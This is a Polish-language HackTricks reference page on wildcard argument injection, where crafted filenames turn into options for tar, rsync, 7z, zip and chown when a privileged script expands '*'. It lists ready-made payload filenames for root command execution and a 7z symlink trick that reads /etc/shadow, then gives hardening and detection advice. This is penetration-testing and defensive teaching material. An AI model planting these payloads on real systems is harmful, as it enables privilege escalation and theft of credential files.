# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wstrzykiwanie **argumentów** z użyciem wildcardów (znane również jako *glob*) ma miejsce, gdy skrypt z uprawnieniami uruchamia binarny plik Unix, taki jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z niecytowanym wildcardem, takim jak `*`.
> Ponieważ powłoka rozwija wildcard **przed** wykonaniem binarnego pliku, atakujący, który może tworzyć pliki w katalogu roboczym, może stworzyć nazwy plików, które zaczynają się od `-`, aby były interpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi lub nawet polecenia.
> Ta strona zbiera najbardziej przydatne prymitywy, najnowsze badania i nowoczesne wykrycia na lata 2023-2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień dowolnego pliku** poprzez nadużycie flagi `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kiedy root później wykonuje coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` jest wstrzykiwane, co powoduje, że *wszystkie* pasujące pliki dziedziczą własność/uprawnienia z `/root/secret``file`.

*PoC & narzędzie*: [`wildpwn`](https://github.com/localh0t/wildpwn) (połączony atak).
Zobacz także klasyczny dokument DefenseCode dla szczegółów.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Wykonaj dowolne polecenia, nadużywając funkcji **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchamia np. `tar -czf /root/backup.tgz *`, `shell.sh` jest wykonywany jako root.

### bsdtar / macOS 14+

Domyślny `tar` w najnowszym macOS (opartym na `libarchive`) *nie* implementuje `--checkpoint`, ale nadal możesz osiągnąć wykonanie kodu za pomocą flagi **--use-compress-program**, która pozwala na określenie zewnętrznego kompresora.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kiedy skrypt z uprawnieniami uruchamia `tar -cf backup.tar *`, `/bin/sh` zostanie uruchomiony.

---

## rsync

`rsync` pozwala na nadpisanie zdalnego powłoki lub nawet zdalnego binarnego za pomocą flag wiersza poleceń, które zaczynają się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później archiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięta flaga uruchamia twoją powłokę po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tryb `rsync`).

---

## 7-Zip / 7z / 7za

Nawet gdy skrypt z uprawnieniami *defensywnie* poprzedza wildcard `--` (aby zatrzymać analizę opcji), format 7-Zip obsługuje **pliki listy plików** poprzez poprzedzenie nazwy pliku `@`. Łączenie tego z dowiązaniem symbolicznym pozwala na *ekstrakcję dowolnych plików*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykonuje coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i zakończy działanie, **drukując zawartość na stderr**.

---

## zip

`zip` obsługuje flagę `--unzip-command`, która jest przekazywana *dosłownie* do powłoki systemowej, gdy archiwum będzie testowane:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injectuj flagę za pomocą spreparowanej nazwy pliku i czekaj, aż skrypt kopii zapasowej z uprawnieniami wywoła `zip -T` (test archiwum) na wynikowym pliku.

---

## Dodatkowe binaria podatne na wstrzykiwanie dzikich kart (szybka lista 2023-2025)

Następujące polecenia były nadużywane w nowoczesnych CTF i rzeczywistych środowiskach. Payload jest zawsze tworzony jako *nazwa pliku* w zapisywalnym katalogu, który później będzie przetwarzany za pomocą dzikiej karty:

| Binary | Flag do nadużycia | Efekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → dowolny `@file` | Odczyt zawartości pliku |
| `flock` | `-c <cmd>` | Wykonaj polecenie |
| `git`   | `-c core.sshCommand=<cmd>` | Wykonanie polecenia przez git przez SSH |
| `scp`   | `-S <cmd>` | Uruchom dowolny program zamiast ssh |

Te prymitywy są mniej powszechne niż klasyki *tar/rsync/zip*, ale warto je sprawdzić podczas polowania.

---

## Wykrywanie i wzmacnianie

1. **Wyłącz globbing powłoki** w krytycznych skryptach: `set -f` (`set -o noglob`) zapobiega rozszerzaniu dzikich kart.
2. **Cytuj lub escape'uj** argumenty: `tar -czf "$dst" -- *` *nie* jest bezpieczne — preferuj `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Jawne ścieżki**: Użyj `/var/www/html/*.log` zamiast `*`, aby atakujący nie mogli tworzyć plików rodzeństwa, które zaczynają się od `-`.
4. **Najmniejsze uprawnienia**: Uruchamiaj zadania kopii zapasowej/konserwacji jako konto usługi bez uprawnień zamiast root, gdy to możliwe.
5. **Monitorowanie**: Wstępnie zbudowana reguła Elastic *Potencjalna powłoka przez wstrzykiwanie dzikich kart* szuka `tar --checkpoint=*`, `rsync -e*` lub `zip --unzip-command` natychmiast po procesie potomnym powłoki. Zapytanie EQL można dostosować do innych EDR.

---

## Odniesienia

* Elastic Security – Wykryta reguła Potencjalna powłoka przez wstrzykiwanie dzikich kart (ostatnia aktualizacja 2025)
* Rutger Flohil – “macOS — Wstrzykiwanie dzikich kart tar” (18 grudnia 2024)

{{#include ../../banners/hacktricks-training.md}}
